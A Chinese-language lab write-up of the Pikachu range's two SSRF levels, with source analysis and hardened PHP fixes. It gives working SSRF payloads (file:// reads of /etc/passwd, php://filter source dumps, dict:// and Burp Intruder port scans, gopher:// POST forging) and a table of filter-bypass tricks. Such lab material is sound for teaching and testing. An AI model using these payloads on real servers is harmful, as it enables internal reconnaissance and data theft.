# **Pikachu SSRF (初级) WriteUp**

## **漏洞概述**

**SSRF（Server-Side Request Forgery，服务器端请求伪造）** 是指攻击者通过控制服务端应用发起请求的目标地址，使服务器以自身身份访问攻击者指定的内部或外部资源。与 CSRF 利用受害者浏览器不同，SSRF 利用的是**服务器自身的网络位置与信任关系**，因此可以绕过外部防火墙，直达 `127.0.0.1`、内网网段、云元数据地址等外部不可达区域。

Pikachu 靶场的 SSRF 模块设置两个关卡，分别对应 PHP 中两类典型的危险函数：

| **关卡** | **入口文件**    | **可控参数** | **危险函数**          | **默认支持的关键协议**           |
| :-------- | :--------------- | :------------ | :--------------------- | :-------------------------------- |
| 关卡 1   | `ssrf_curl.php` | `url`        | `curl_exec()`         | http、file、dict、gopher、ftp 等 |
| 关卡 2   | `ssrf_fgc.php`  | `file`       | `file_get_contents()` | http、file、php://filter 等      |

两关的共同根因一致：**用户输入被直接作为请求目标，未对 scheme、host、端口做任何校验**，且返回了请求的完整响应体，构成“有回显的 SSRF”。

## **源码分析**

### **关卡 1：ssrf_curl.php**

核心代码如下（已注释）：

<span style="color: rgb(249, 250, 251); font-size: 12px">php</span>

```plaintext
<?php
if(isset($_GET['url']) && $_GET['url'] != null){
    $URL = $_GET['url'];                    // 用户输入直接赋给 $URL
    $CH = curl_init($URL);                  // 直接作为 cURL 目标地址
    curl_setopt($CH, CURLOPT_HEADER, FALSE);
    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
    $RES = curl_exec($CH);                  // 执行请求，支持 libcurl 全部协议
    curl_close($CH);
    echo $RES;                              // 完整回显响应体
}
?>
```

**根因拆解**：

- **无任何输入校验**：`$_GET['url']` 未经 `parse_url()`、白名单或 IP 判断，直接进入 `curl_init()`。
- **协议未限制**：libcurl 默认支持 http、https、ftp、gopher、dict、file、ldap、telnet 等协议，攻击者可将目标从 `http://` 切换为 `file://` 或 `dict://`。
- **回显完整响应**：`echo $RES` 将服务端请求到的任意内容返回给前端，使盲 SSRF 变为有回显 SSRF，利用门槛大幅降低。

### **关卡 2：ssrf_fgc.php**

该关卡使用 `file_get_contents()`，参数名变为 `file`，后端典型逻辑如下：

<span style="color: rgb(249, 250, 251); font-size: 12px">php</span>

```plaintext
<?php
if(isset($_GET['file'])){
    $filename = $_GET['file'];
    echo file_get_contents($filename);      // 直接读取用户指定的“文件/URL”
}
?>
```

`file_get_contents()` 不仅能读取本地路径，还能通过 HTTP/FTP 读取远程资源；当开启 `allow_url_fopen`（PHP 默认开启）时，`php://filter`、`file://`、`data://` 等 wrapper 均可被利用。与 curl 关卡的关键区别是：**file_get_contents 关卡对 gopher、dict 等网络协议的支持取决于 PHP 配置和 wrapper 可用性，实战中 php://filter 读取源码是该关卡最稳定的利用路径**。

## **手工利用完整流程**

以下假设靶场部署在 `192.168.59.1`（也可替换为 `127.0.0.1`），路径为 `/pikachu/vul/ssrf/`。

### **关卡 1（curl）：从正常请求到内网探测**

#### **步骤 1：确认可控参数与回显**

访问：

<span style="color: rgb(249, 250, 251); font-size: 12px">text</span>

```plaintext
http://192.168.59.1/pikachu/vul/ssrf/ssrf_curl.php
```

页面中存在一个可点击链接，点击后 URL 变为：

<span style="color: rgb(249, 250, 251); font-size: 12px">text</span>

```plaintext
http://192.168.59.1/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
```

**目的**：确认 `url` 参数完全可控，且服务端会将 `http://127.0.0.1/...` 的响应内容回显到页面。若正常回显，说明 SSRF 入口成立。

#### **步骤 2：file 协议读取服务器本地文件**

将 `url` 参数替换为：

<span style="color: rgb(249, 250, 251); font-size: 12px">text</span>

```plaintext
http://192.168.59.1/pikachu/vul/ssrf/ssrf_curl.php?url=file:///C:/Windows/win.ini
```

Linux 靶场可使用：

<span style="color: rgb(249, 250, 251); font-size: 12px">text</span>

```plaintext
?url=file:///etc/passwd
```

**目的**：验证 `file://` 协议未被禁用，证明攻击者可以读取服务器本地任意可读文件。`curl` 对 `file://` 的读取能力是该关卡最直接的危害体现。

#### **步骤 3：dict 协议探测内网端口与服务指纹**

探测本机 MySQL 端口：

<span style="color: rgb(249, 250, 251); font-size: 12px">text</span>

```plaintext
http://192.168.59.1/pikachu/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:3306
```

若 3306 开放，响应中可能返回类似 `5.7.26` 的版本信息；若端口关闭，通常表现为连接失败或超时。**目的**：利用 `dict://` 获取端口开放状态与服务指纹，完成内网服务发现。

#### **步骤 4：http 协议访问内网其他应用**

<span style="color: rgb(249, 250, 251); font-size: 12px">text</span>

```plaintext
?url=http://127.0.0.1/upload-labs/
```

或：

<span style="color: rgb(249, 250, 251); font-size: 12px">text</span>

```plaintext
?url=http://127.0.0.1/pikachu/test/yijuhua.txt
```

**目的**：以服务器为跳板，访问仅监听在 `127.0.0.1` 或内网网段的其他 Web 应用，获取原本外部无法直接访问的页面内容。

### **关卡 2（file_get_contents）：php://filter 读取源码**

进入 `ssrf_fgc.php`，页面链接中参数为 `file`：

<span style="color: rgb(249, 250, 251); font-size: 12px">text</span>

```plaintext
http://192.168.59.1/pikachu/vul/ssrf/ssrf_fgc.php?file=info2.php
```

#### **步骤 1：php://filter 读取 PHP 源码（Base64 编码）**

直接读取 `.php` 文件时，PHP 解释器会执行代码，源码不会回显。使用 `php://filter` 的 `convert.base64-encode` 过滤器，先编码再读取：

<span style="color: rgb(249, 250, 251); font-size: 12px">text</span>

```plaintext
http://192.168.59.1/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf_fgc.php
```

将响应中得到的 Base64 字符串复制，在本地解码，即可获得 `ssrf_fgc.php` 的完整源码。

#### **步骤 2：file:// 读取系统文件**

<span style="color: rgb(249, 250, 251); font-size: 12px">text</span>

```plaintext
?file=file:///C:/Windows/win.ini
```

或 Linux：

<span style="color: rgb(249, 250, 251); font-size: 12px">text</span>

```plaintext
?file=file:///etc/passwd
```

**目的**：与 curl 关卡一致，验证本地文件读取能力。`file_get_contents()` 对 `file://` wrapper 的支持使其同样可直接读取磁盘文件。

## **工具利用**

### **Burp Suite Intruder：内网端口批量探测**

**场景**：手工逐个尝试端口效率低，需要对 `127.0.0.1` 的 1–65535 或指定范围进行批量探测，并根据**响应长度差异**识别开放端口。

**操作步骤**：

1. 在浏览器中触发一次正常的 `ssrf_curl.php?url=http://127.0.0.1:80/` 请求，Burp Proxy 捕获该请求。
2. 右键请求 → **Send to Intruder**。
3. 在 **Positions** 选项卡中，清除所有自动标记，仅将 URL 中的端口号 `80` 用 `§` 包围：

<span style="color: rgb(249, 250, 251); font-size: 12px">http</span>

```plaintext
GET /pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:§80§/ HTTP/1.1
Host: 192.168.59.1
```

4. **Payloads** 选项卡：
   - Payload type：**Numbers**
   - From：`1`，To：`65535`（实验环境可缩小至 `3000-9000` 或 `1-10000`），Step：`1`。
5. **Options** 中勾选 **Length** 列，便于按响应长度排序。
6. 启动攻击，按 **Length** 排序，**响应长度明显异于超时/错误页面的条目**对应的端口很可能处于开放状态。Pikachu 环境中常见 3306（MySQL）、80、8080 等端口会出现可识别的响应。

> **说明**：Intruder 社区版有人工限速，但端口探测场景下仍可使用；若追求效率，也可用 `ffuf` 对 `url=http://127.0.0.1:FUZZ/` 进行 FUZZ。

### **Gopher 协议构造 POST 请求（进阶利用）**

当内网服务需要 POST 请求才能触发敏感操作时，`gopher://` 是最强大的协议：它可以将任意 TCP 数据流封装进 URL，让 curl 向目标端口发送完全自定义的原始报文。

以下以向 `127.0.0.1:80/flag.php` 发送 POST 为例，展示构造思路：

**原始 HTTP 报文**：

<span style="color: rgb(249, 250, 251); font-size: 12px">http</span>

```plaintext
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=e5b1f488acba169d68b828a7b3b6a7bc
```

**编码要点**：

- gopher 的 payload 需要 **两次 URL 编码**（浏览器一次，curl 一次）。
- 第一次编码后，将所有 `%0A`（裸换行）替换为 `%0D%0A`（CRLF），否则 HTTP 报文格式可能不被目标服务接受。
- gopher URL 的路径部分以下划线 `_` 开头，其后紧跟编码后的数据。

**最终 payload 形态**：

<span style="color: rgb(249, 250, 251); font-size: 12px">text</span>

```plaintext
?url=gopher://127.0.0.1:80/_%2547%2545%2554%2520...（两次编码后的完整报文）
```

由于完整 payload 极长，实战中通常借助 **Gopherus** 生成：

<span style="color: rgb(249, 250, 251); font-size: 12px">bash</span>

```plaintext
python gopherus.py --exploit fastcgi
# 或手动使用脚本对原始报文进行双重编码
```

> **注意**：Pikachu 的 curl 关卡本身已支持 gopher，无需额外配置；但如果目标 PHP 禁用了 `CURLOPT_PROTOCOLS` 中的 gopher，则该利用链不成立，需退回 file/dict/http 协议。

## **常用 Payload 与绕过技巧**

| **目的**                    | **协议 / 技巧** | **Payload 示例**                                                | **说明**                           |
| :--------------------------- | :--------------- | :--------------------------------------------------------------- | :---------------------------------- |
| 本地文件读取                | `file://`       | `file:///etc/passwd`、`file:///C:/Windows/win.ini`              | 最直接，无需网络服务               |
| 源码读取                    | `php://filter`  | `php://filter/read=convert.base64-encode/resource=ssrf_fgc.php` | 避免 PHP 执行，获取源码            |
| 端口/服务探测               | `dict://`       | `dict://127.0.0.1:3306`                                         | 可获取部分服务 banner              |
| 自定义 TCP/HTTP 报文        | `gopher://`     | `gopher://127.0.0.1:80/_POST%20...`                             | 可发 POST、打 Redis/FastCGI 等     |
| 访问内网 Web                | `http://`       | `http://127.0.0.1/admin/`                                       | 最基础的内网横向                   |
| 绕过 localhost 字符串黑名单 | 十进制 IP       | `http://2130706433/`                                            | `2130706433` = `127.0.0.1`         |
| 绕过 localhost 字符串黑名单 | 八进制 IP       | `http://0177.0.0.1/`                                            | 部分解析器可识别                   |
| 绕过 host 白名单（@ 混淆）  | URL userinfo    | `http://expected.com@127.0.0.1/`                                | 解析器取 `@` 后的 host             |
| 绕过 host 白名单（IPv6）    | IPv6 回环       | `http://[::1]:80/`                                              | 黑名单若只写 `127.0.0.1` 则失效    |
| 开放重定向链绕过            | 302 跳转        | 先请求白名单域名，再 302 到内网                                 | 需 `FOLLOWLOCATION` 开启且未重校验 |

**关于 Pikachu 的说明**：Pikachu 两个关卡本身**未设置黑名单/白名单**，上述绕过技巧在靶场中并非必需，但它们对应真实场景中 SSRF 修复不完整时的典型绕过路径，建议作为知识延伸掌握。

## **漏洞成因与防御措施**

### **根本原因**

两关的根因可以统一表述为：**“用户可控的请求目标” + “协议未限制” + “响应回显”**。`curl_exec()` 和 `file_get_contents()` 本身是合法工具，危险在于将未经校验的外部输入直接作为 URL/文件名传入，且未对允许的 scheme、host、port 做任何约束。

### **防御代码示例（PHP）**

以下给出一个可落地的 **curl 安全封装**，核心思想是 **scheme 白名单 + host 白名单/公网 IP 校验 + 禁用危险协议 + 关闭自动跳转**。

<span style="color: rgb(249, 250, 251); font-size: 12px">php</span>

```plaintext
<?php
function safeCurl(string $userUrl): string
{
    $parsed = parse_url($userUrl);
    if ($parsed === false || empty($parsed['scheme']) || empty($parsed['host'])) {
        throw new InvalidArgumentException('Invalid URL');
    }

    // 1. scheme 白名单：仅允许 http/https
    $scheme = strtolower($parsed['scheme']);
    if (!in_array($scheme, ['http', 'https'], true)) {
        throw new InvalidArgumentException('Scheme not allowed');
    }

    // 2. host 白名单（推荐）或公网 IP 校验
    $allowedHosts = ['api.example.com', 'trusted-service.com'];
    if (!in_array(strtolower($parsed['host']), $allowedHosts, true)) {
        throw new InvalidArgumentException('Host not allowed');
    }

    // 若必须允许任意公网 host，则用 DNS 解析后做 IP 校验
    $ip = gethostbyname($parsed['host']);
    if (filter_var($ip, FILTER_VALIDATE_IP,
        FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        throw new InvalidArgumentException('Private/reserved IP blocked');
    }

    $ch = curl_init($userUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    // 3. 限制协议，只允许 HTTP/HTTPS
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
    // 4. 关闭自动跳转，防止 302 绕过
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    $res = curl_exec($ch);
    if ($res === false) {
        curl_close($ch);
        throw new RuntimeException('Request failed');
    }
    curl_close($ch);
    return $res;
}
```

**关键点解释**：

- `parse_url()` 先拆解 URL，**不要直接用原始字符串做黑名单匹配**；对于 `http://evil.com@127.0.0.1` 这类畸形 URL，应以解析结果的 `host` 为准。
- 仅做 `strpos($url, '127.0.0.1')` 之类的字符串黑名单是可绕过的（十进制、八进制、IPv6、DNS 重绑定等）；**白名单 + IP 校验**才是可落地的方向。
- `CURLOPT_PROTOCOLS` 在 PHP 中可强制限制 curl 可用协议，直接封堵 `file://`、`gopher://`、`dict://`。
- `CURLOPT_FOLLOWLOCATION, false` 是必须的：若开启跳转，攻击者可先请求白名单域名再 302 到内网，导致前置校验失效。

### **file_get_contents 关卡的防御**

<span style="color: rgb(249, 250, 251); font-size: 12px">php</span>

```plaintext
<?php
// 方案 A（根本）：生产环境关闭 allow_url_fopen
// php.ini: allow_url_fopen = Off

// 方案 B：必须开启时，先校验再读取
function safeRead(string $file): string
{
    $parsed = parse_url($file);
    if ($parsed !== false && !empty($parsed['scheme'])) {
        // 若输入带 scheme，只允许 http/https，拒绝 file/php/data 等
        $scheme = strtolower($parsed['scheme']);
        if (!in_array($scheme, ['http', 'https'], true)) {
            throw new InvalidArgumentException('Wrapper not allowed');
        }
    }
    // 本地路径场景：用 realpath 限制在指定基目录内
    $base = '/var/www/allowed_uploads/';
    $real = realpath($file);
    if ($real === false || strpos($real, realpath($base)) !== 0) {
        throw new InvalidArgumentException('Path not allowed');
    }
    return file_get_contents($real);
}
```

`allow_url_fopen = Off` 是 `file_get_contents()` 场景最彻底的缓解措施；如果业务必须读取远程 URL，则应在调用前完成与 curl 相同粒度的 scheme/host/IP 校验，并禁用 `php://`、`data://`、`file://` 等 wrapper。

### **防御措施对比**

| **防御层次** | **措施**                                                  | **对 curl 关卡**             | **对 file_get_contents 关卡** | **备注**         |
| :------------ | :--------------------------------------------------------- | :---------------------------- | :----------------------------- | :---------------- |
| 协议层       | 仅允许 http/https（`CURLOPT_PROTOCOLS` / wrapper 白名单） | ✅ 直接封堵 file/dict/gopher | ✅ 需配合 `allow_url_fopen`   | 第一道防线       |
| 目标层       | host 白名单 / 公网 IP 校验                                | ✅                           | ✅                            | 白名单优于黑名单 |
| 跳转层       | `FOLLOWLOCATION=false`                                    | ✅                           | N/A                           | 防 302 绕过      |
| 配置层       | `allow_url_fopen = Off`                                   | 不涉及                       | ✅ 根本性                     | 可能影响业务     |
| 架构层       | 独立代理/出口网关做统一 URL 过滤                          | ✅                           | ✅                            | 纵深防御         |

## **总结**

Pikachu 的 SSRF 模块定位为 **初级 SSRF**：两个关卡均没有任何过滤，攻击者可以在 `url`/`file` 参数中直接切换协议，完成本地文件读取、内网 Web 访问、端口探测和源码读取。其教学价值在于清晰暴露“**用户输入直接进入 HTTP 客户端函数**”这一根因，并为后续学习 gopher 打内网、DNS 重绑定、云元数据访问等中级技术提供基础。

| **对比维度** | **关卡 1（curl）**                 | **关卡 2（file_get_contents）**                      |
| :------------ | :---------------------------------- | :---------------------------------------------------- |
| 入口参数     | `url`                              | `file`                                               |
| 默认协议面   | 广（http/file/dict/gopher/ftp 等） | 取决于 `allow_url_fopen`，file/http/php wrapper 可用 |
| 最稳定利用   | `file://` 读文件、`dict://` 探端口 | `php://filter` 读源码、`file://` 读文件              |
| 防御重点     | 限制 scheme + 关闭跳转 + IP 校验   | `allow_url_fopen=Off` + wrapper 白名单               |
| 难度评估     | 初级                               | 初级（php://filter 需理解 wrapper 机制，略有提升）   |

> 本文仅用于靶场学习与授权测试，请遵守法律法规。